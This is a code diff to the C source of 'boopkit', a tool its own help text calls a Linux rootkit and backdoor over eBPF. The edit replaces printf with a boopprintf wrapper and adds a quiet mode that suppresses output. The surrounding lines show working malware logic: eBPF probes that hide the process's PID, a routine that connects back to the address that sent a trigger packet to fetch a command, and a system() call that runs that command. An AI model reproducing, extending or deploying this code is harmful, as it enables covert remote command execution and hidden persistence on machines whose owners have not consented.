@@ -36,34 +36,23 @@
 
 // clang-format off
 #include "boopkit.h"
+#include "common.h"
 #include "pr0be.skel.h"
 // clang-format on
-
-// asciiheader is the main runtime banner.
-void asciiheader() {
-  printf("\n\n");
-  printf("   ██████╗  ██████╗  ██████╗ ██████╗ ██╗  ██╗██╗████████╗\n");
-  printf("   ██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║╚══██╔══╝\n");
-  printf("   ██████╔╝██║   ██║██║   ██║██████╔╝█████╔╝ ██║   ██║   \n");
-  printf("   ██╔══██╗██║   ██║██║   ██║██╔═══╝ ██╔═██╗ ██║   ██║   \n");
-  printf("   ██████╔╝╚██████╔╝╚██████╔╝██║     ██║  ██╗██║   ██║   \n");
-  printf("   ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝   ╚═╝   \n");
-  printf("\n\n");
-}
-
 void usage() {
-  printf("Boopkit version: %s\n", VERSION);
-  printf("Linux rootkit and backdoor over eBPF.\n");
-  printf("Author: Kris Nóva <kris@nivenly.com>\n");
-  printf("\n");
-  printf("Usage: \n");
-  printf("boopkit [options]\n");
-  printf("\n");
-  printf("Options:\n");
-  printf("-h, help           Display help and usage for boopkit.\n");
-  printf("-s, sudo-bypass    Bypass sudo check. Breaks PID obfuscation.\n");
-  printf("-x, reject         Source addresses to reject triggers from.\n");
-  printf("\n");
+  boopprintf("Boopkit version: %s\n", VERSION);
+  boopprintf("Linux rootkit and backdoor over eBPF.\n");
+  boopprintf("Author: Kris Nóva <kris@nivenly.com>\n");
+  boopprintf("\n");
+  boopprintf("Usage: \n");
+  boopprintf("boopkit [options]\n");
+  boopprintf("\n");
+  boopprintf("Options:\n");
+  boopprintf("-h, help           Display help and usage for boopkit.\n");
+  boopprintf("-s, sudo-bypass    Bypass sudo check. Breaks PID obfuscation.\n");
+  boopprintf("-q, quiet          Disable output.\n");
+  boopprintf("-x, reject         Source addresses to reject triggers from.\n");
+  boopprintf("\n");
   exit(0);
 }
 
@@ -72,16 +61,16 @@ int recvrce(char dial[INET_ADDRSTRLEN], char *rce) {
   daddr.sin_family = AF_INET;
   daddr.sin_port = htons(PORT);
   if (inet_pton(AF_INET, dial, &daddr.sin_addr) != 1) {
-    printf(" XX Destination IP configuration failed.\n");
+    boopprintf(" XX Destination IP configuration failed.\n");
     return 1;
   }
   char printdial[INET_ADDRSTRLEN];
   inet_ntop(AF_INET, &daddr.sin_addr, printdial, sizeof printdial);
-  printf("  ** Boop: %s\n", printdial);
+  boopprintf("  ** Boop: %s\n", printdial);
 
   int revsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   if (revsock == -1) {
-    // printf(" XX Socket creation failed\n");
+    // boopprintf(" XX Socket creation failed\n");
     return 1;
   }
 
@@ -93,24 +82,24 @@ int recvrce(char dial[INET_ADDRSTRLEN], char *rce) {
   retval = setsockopt(revsock, SOL_SOCKET, SO_SNDTIMEO,
                       (struct timeval *)&retry, sizeof(struct timeval));
   if (retval != 0) {
-    printf("Error (%d) setting socket SO_SNDTIMEO: %s\n", retval,
+    boopprintf("Error (%d) setting socket SO_SNDTIMEO: %s\n", retval,
            strerror(errno));
     return 1;
   }
   retval = setsockopt(revsock, SOL_SOCKET, SO_RCVTIMEO,
                       (struct timeval *)&retry, sizeof(struct timeval));
   if (retval != 0) {
-    printf("Error (%d) setting socket SO_RCVTIMEO: %s\n", retval,
+    boopprintf("Error (%d) setting socket SO_RCVTIMEO: %s\n", retval,
            strerror(errno));
     return 1;
   }
 
   if (connect(revsock, (struct sockaddr *)&daddr, sizeof daddr) < 0) {
-    // printf(" XX Connection SOCK_STREAM refused.\n");
+    // boopprintf(" XX Connection SOCK_STREAM refused.\n");
     return 1;
   }
 
-  // printf("***READ***\n");
+  // boopprintf("***READ***\n");
   char buffer[MAX_RCE_SIZE];
   read(revsock, buffer, MAX_RCE_SIZE);
   close(revsock);
@@ -152,6 +141,9 @@ void clisetup(int argc, char **argv) {
         case 'h':
           usage();
           break;
+        case 'q':
+          quiet = 1;
+          break;
       }
     }
   }
@@ -170,31 +162,31 @@ static int handlepidlookup(void *ctx, void *data, size_t data_sz) {
 
 void rootcheck(int argc, char **argv) {
   long luid = (long)getuid();
-  printf("  -> getuid()  : %ld\n", luid);
+  boopprintf("  -> getuid()  : %ld\n", luid);
   if (luid != 0) {
-    printf("  XX Invalid UID.\n");
+    boopprintf("  XX Invalid UID.\n");
     if (!cfg.sudobypass) {
-      printf("  XX Permission denied.\n");
+      boopprintf("  XX Permission denied.\n");
       exit(1);
     }
-    printf("  XX sudo bypass enabled! PID obfuscation will not work!\n");
+    boopprintf("  XX sudo bypass enabled! PID obfuscation will not work!\n");
   }
   long lpid = (long)getpid();
   long lppid = (long)getppid();
-  printf("  -> getpid()  : %ld\n", lpid);
-  printf("  -> getppid() : %ld\n", lppid);
+  boopprintf("  -> getpid()  : %ld\n", lpid);
+  boopprintf("  -> getppid() : %ld\n", lppid);
   if (lpid - lppid == 1) {
     // We assume we are running with sudo at this point!
     // If the ppid() and pid() are close together this
     // implies that the process tree has cascaded a new
     // ppid() for the process. In other words, we are probably
     // running with sudo (or similar).
-    printf("  XX Running as cascaded pid (sudo) is invalid for obfuscation.\n");
+    boopprintf("  XX Running as cascaded pid (sudo) is invalid for obfuscation.\n");
     if (!cfg.sudobypass) {
-      printf("  XX Permission denied.\n");
+      boopprintf("  XX Permission denied.\n");
       exit(1);
     }
-    printf("  XX sudo bypass enabled! PID obfuscation will not work!\n");
+    boopprintf("  XX sudo bypass enabled! PID obfuscation will not work!\n");
   }
 }
 
@@ -208,7 +200,7 @@ int main(int argc, char **argv) {
   asciiheader();
   clisetup(argc, argv);
   rootcheck(argc, argv);
-  printf("  -> Logs: cat /sys/kernel/tracing/trace_pipe\n");
+  boopprintf("  -> Logs: cat /sys/kernel/tracing/trace_pipe\n");
   // Return value for eBPF loading
   int loaded, err;
 
@@ -218,7 +210,7 @@ int main(int argc, char **argv) {
   // This will load the safe kernel probes at runtime.
   //
   struct pr0be_safe *sfobj;
-  printf("  -> Loading eBPF Probe: %s\n", cfg.pr0besafepath);
+  boopprintf("  -> Loading eBPF Probe: %s\n", cfg.pr0besafepath);
   sfobj = pr0be_safe__open();
   char pid[MAXPIDLEN];
   // getpid()
@@ -227,19 +219,19 @@ int main(int argc, char **argv) {
   //       will manage ensuring we are executing this program without sudo
   env.pid_to_hide = getpid();
   sprintf(pid, "%d", env.pid_to_hide);
-  printf("  -> Obfuscating PID: %s\n", pid);
+  boopprintf("  -> Obfuscating PID: %s\n", pid);
   strncpy(sfobj->rodata->pid_to_hide, pid, sizeof(sfobj->rodata->pid_to_hide));
 
   sfobj->rodata->pid_to_hide_len = strlen(pid) + 1;
   sfobj->rodata->target_ppid = env.target_ppid;
   loaded = pr0be_safe__load(sfobj);
   if (loaded < 0) {
-    printf("Unable to load eBPF object: %s\n", cfg.pr0besafepath);
-    printf("Privileged acces required to load eBPF probe!\n");
-    printf("Permission denied.\n");
+    boopprintf("Unable to load eBPF object: %s\n", cfg.pr0besafepath);
+    boopprintf("Privileged acces required to load eBPF probe!\n");
+    boopprintf("Permission denied.\n");
     return 1;
   }
-  printf("  -> eBPF Probe loaded: %s\n", cfg.pr0besafepath);
+  boopprintf("  -> eBPF Probe loaded: %s\n", cfg.pr0besafepath);
 
   // Exit
   int index = PROG_01;
@@ -247,7 +239,7 @@ int main(int argc, char **argv) {
   int ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array), &index,
                                 &prog_fd, BPF_ANY);
   if (ret == -1) {
-    printf("Failed to hide PID: %s\n", strerror(errno));
+    boopprintf("Failed to hide PID: %s\n", strerror(errno));
     return 1;
   }
 
@@ -257,14 +249,14 @@ int main(int argc, char **argv) {
   ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array), &index,
                             &prog_fd, BPF_ANY);
   if (ret == -1) {
-    printf("Failed to obfuscated PID\n");
+    boopprintf("Failed to obfuscated PID\n");
     return 1;
   }
 
   // Attach to probe
   err = pr0be_safe__attach(sfobj);
   if (err) {
-    printf("Failed to attach %s\n", cfg.pr0besafepath);
+    boopprintf("Failed to attach %s\n", cfg.pr0besafepath);
     return 1;
   }
 
@@ -273,7 +265,7 @@ int main(int argc, char **argv) {
   rb = ring_buffer__new(bpf_map__fd(sfobj->maps.rb), handlepidlookup, NULL,
                         NULL);
   if (!rb) {
-    printf("Failed to create ring buffer\n");
+    boopprintf("Failed to create ring buffer\n");
     return 1;
   }
 
@@ -283,30 +275,30 @@ int main(int argc, char **argv) {
   // This will load the boop kernel probes at runtime.
   //
   struct bpf_object *bpobj;
-  printf("  -> Loading eBPF Probe: %s\n", cfg.pr0bebooppath);
+  boopprintf("  -> Loading eBPF Probe: %s\n", cfg.pr0bebooppath);
   bpobj = bpf_object__open(cfg.pr0bebooppath);
   if (!bpobj) {
-    printf("Unable to open eBPF object: %s\n", cfg.pr0bebooppath);
-    printf("Privileged acces required to load eBPF probe!\n");
-    printf("Permission denied.\n");
+    boopprintf("Unable to open eBPF object: %s\n", cfg.pr0bebooppath);
+    boopprintf("Privileged acces required to load eBPF probe!\n");
+    boopprintf("Permission denied.\n");
     return 1;
   }
   loaded = bpf_object__load(bpobj);
   if (loaded < 0) {
-    printf("Unable to load eBPF object: %s\n", cfg.pr0bebooppath);
+    boopprintf("Unable to load eBPF object: %s\n", cfg.pr0bebooppath);
     return 1;
   }
-  printf("  -> eBPF Probe loaded: %s\n", cfg.pr0bebooppath);
+  boopprintf("  -> eBPF Probe loaded: %s\n", cfg.pr0bebooppath);
   struct bpf_program *program = NULL;
   bpf_object__for_each_program(program, bpobj) {
-    printf("  -> eBPF Program Address: %p\n", program);
+    boopprintf("  -> eBPF Program Address: %p\n", program);
     const char *progname = bpf_program__name(program);
-    printf("  -> eBPF Program Name: %s\n", progname);
+    boopprintf("  -> eBPF Program Name: %s\n", progname);
     const char *progsecname = bpf_program__section_name(program);
-    printf("  -> eBPF Program Section Name: %s\n", progsecname);
+    boopprintf("  -> eBPF Program Section Name: %s\n", progsecname);
     struct bpf_link *link = bpf_program__attach(program);
     if (!link) {
-      printf("Unable to link eBPF program: %s\n", progname);
+      boopprintf("Unable to link eBPF program: %s\n", progname);
       continue;
     }
   }
@@ -319,12 +311,12 @@ int main(int argc, char **argv) {
   // map from the probe.
   struct bpf_map *bpmap = bpf_object__next_map(bpobj, NULL);
   const char *mapname = bpf_map__name(bpmap);
-  printf("  -> eBPF Map Name: %s\n", mapname);
+  boopprintf("  -> eBPF Map Name: %s\n", mapname);
   int fd = bpf_map__fd(bpmap);
-  printf("  -> eBPF Program Linked!\n");
+  boopprintf("  -> eBPF Program Linked!\n");
 
   for (int i = 0; i < cfg.denyc; i++) {
-    printf("   X Deny address: %s\n", cfg.deny[i]);
+    boopprintf("   X Deny address: %s\n", cfg.deny[i]);
   }
 
   // ===========================================================================
@@ -361,10 +353,10 @@ int main(int argc, char **argv) {
       if (!ignore) {
         char *rce = malloc(MAX_RCE_SIZE);
         int retval;
-        printf("  -> encapsulated: %s\n", ret.rce);
+        boopprintf("  -> encapsulated: %s\n", ret.rce);
         retval = recvrce(saddrval, rce);
         if (retval == 0) {
-          printf("<- Executing: %s\r\n", rce);
+          boopprintf("<- Executing: %s\r\n", rce);
           system(rce);
         }
         free(rce);
